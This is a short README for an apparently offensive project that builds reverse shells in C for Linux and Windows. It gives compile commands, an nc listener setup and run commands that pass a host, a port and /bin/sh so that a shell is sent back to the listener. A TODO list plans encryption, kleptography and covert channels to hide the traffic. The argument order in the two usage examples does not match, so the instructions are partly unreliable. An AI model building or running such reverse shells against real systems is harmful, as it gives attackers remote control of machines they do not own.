# Concept

Making Reverse Shells in C for both OS's (Windows & Linux)


## Linux
### Compiling & Usage

```bash
# Compile it
gcc -o linux_rev_shell.elf linux_rev_shell.c

## Another system:
## set up a listener 
nc -nvlp -k 1234

## Set up env variables for easy execution in terminal
# Execute it, passing the env variables.
RP="1234" && RH="127.0.0.1" && BIN="/bin/sh"  && ./linux_rev_shell.elf $RP $RH $BIN

```

## Windows
### Compiling & Usage

```bash
# Compile it
i686-w64-mingw32-gcc -o windows_rev_shell.exe windows_rev_shell.c -lws2_32

## Another system:
## set up a listener 
nc -nvlp -k 1234

## Set up env variables for easy execution in terminal
# Execute it, passing the env variables.
windows_rev_shell.exe $IP $RP $BIN
```

## TODO for both OS
- [ ] debug (print outs, etc)
- [ ] more checks
- [ ] encryption
- [ ] LISTEN | CLIENT for both, so no need for NC and stuff.
- [ ] Implement Secure channels, including(but not lim. To)
    - [ ] Cryptography
    - [ ] Kleptography
    - [ ] Covert Channels
    - Like [This](https://embeddedsw.net/Cipher_Reference_Home.html) and [This](https://embeddedsw.net/libObfuscate_Cryptography_Home.html) (both `embeddedsw.net`)
